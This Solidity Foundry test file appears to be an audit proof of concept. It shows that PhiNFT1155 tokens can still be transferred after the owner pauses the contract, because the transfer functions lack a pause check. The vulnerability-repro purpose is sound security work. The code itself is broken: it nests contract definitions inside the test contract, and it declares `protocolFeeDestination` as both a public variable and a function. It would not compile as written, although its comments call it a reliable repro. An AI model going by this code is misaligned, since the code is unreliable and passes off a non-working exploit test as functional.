// SPDX-License-Identifier: MIT
pragma solidity 0.8.25;

// Foundry test utilities
import "forge-std/Test.sol";

// Target contract
import { PhiNFT1155 } from "src/art/PhiNFT1155.sol";
import { IPhiFactory } from "src/interfaces/IPhiFactory.sol";

contract ExploitTest is Test {
    ////////////////////////////////////////////////////////////////
    //                       Helper Contracts                     //
    ////////////////////////////////////////////////////////////////

    /**
     * @notice Minimal factory stub that fulfils ONLY the functions actually
     *         exercised by the PhiNFT1155 code-paths used in this PoC.
     *
     *         We do NOT inherit from IPhiFactory on purpose – implementing the
     *         full interface is unnecessary bloat.  The NFT contract interacts
     *         with the stub through the generic address->interface cast, so
     *         type-safety is not enforced by the compiler.
     */
    contract MockPhiFactory {
        // --- Public storage that the NFT contract expects -------------
        address public protocolFeeDestination;

        // Dummy struct copied from the real interface for type-compatibility
        struct ArtData {
            address artist;
            address receiver;
            uint256 mintFee;
            bool    soulBounded;
        }

        constructor(address _feeDestination) {
            protocolFeeDestination = _feeDestination;
        }

        // --- Functions invoked by PhiNFT1155 --------------------------

        function protocolFeeDestination() external view returns (address) {
            return protocolFeeDestination;
        }

        /// @notice Always return an ArtData record with `soulBounded = false`
        ///         so that transfers are allowed.
        function artData(uint256) external pure returns (ArtData memory data) {
            // All zeroed fields are fine for this PoC
            data.soulBounded = false;
        }
    }

    /**
     * @notice Thin helper that exposes the internal `_mint` function so we can
     *         mint test tokens without needing the entire factory/rewards
     *         plumbing.  The vulnerable transfer logic is inherited unchanged.
     */
    contract PhiNFT1155Exposed is PhiNFT1155 {
        function exposedMint(address to_, uint256 id_, uint256 amount_) external {
            _mint(to_, id_, amount_, "");
        }
    }

    ////////////////////////////////////////////////////////////////
    //                         Test State                          //
    ////////////////////////////////////////////////////////////////

    PhiNFT1155Exposed private nft;
    MockPhiFactory    private factory;

    address private alice = vm.addr(0xA11CE);
    address private bob   = vm.addr(0xB0B);
    address private feeDest = vm.addr(0xFEE);

    ////////////////////////////////////////////////////////////////
    //                          setUp()                            //
    ////////////////////////////////////////////////////////////////

    function setUp() external {
        // Give test users some ether for good measure
        vm.deal(alice, 100 ether);
        vm.deal(bob,   100 ether);

        // Deploy the mocked factory that will become the owner of the NFT
        factory = new MockPhiFactory(feeDest);

        // Deploy the ERC-1155 implementation with the vulnerability
        nft = new PhiNFT1155Exposed();

        // Initialise the contract – msg.sender MUST be the factory to pass
        // the `onlyPhiFactory` check inside `initialize()`
        vm.prank(address(factory));
        nft.initialize(
            1,          // credChainId_
            1,          // credId_
            "TEST",     // verificationType_
            feeDest     // protocolFeeDestination_ (ignored, overwritten)
        );

        // Mint one transferable token (id = 1) to Alice
        nft.exposedMint(alice, 1, 1);
    }

    ////////////////////////////////////////////////////////////////
    //                     Exploit Demonstration                   //
    ////////////////////////////////////////////////////////////////

    /**
     * @dev The contract owner (factory) pauses the NFT.  Alice is STILL able
     *      to transfer her token to Bob because the transfer functions forgot
     *      to add the `whenNotPaused` modifier or call `_requireNotPaused()`.
     *
     *      If the vulnerability were patched the call would revert, causing the
     *      test to fail – therefore this is a reliable repro.
     */
    function test_TransferSucceedsWhilePaused() external {
        // Pause the contract – must be done by the owner (factory)
        vm.prank(address(factory));
        nft.pause();
        assertTrue(nft.paused(), "Contract should be in paused state");

        // Alice transfers her token to Bob while paused
        vm.prank(alice);
        nft.safeTransferFrom(alice, bob, 1, 1, "");

        // Validate balances: Alice -> 0, Bob -> 1  (transfer succeeded)
        assertEq(nft.balanceOf(alice, 1), 0,   "Alice should no longer own the token");
        assertEq(nft.balanceOf(bob,   1), 1,   "Bob should now own the token");
    }
}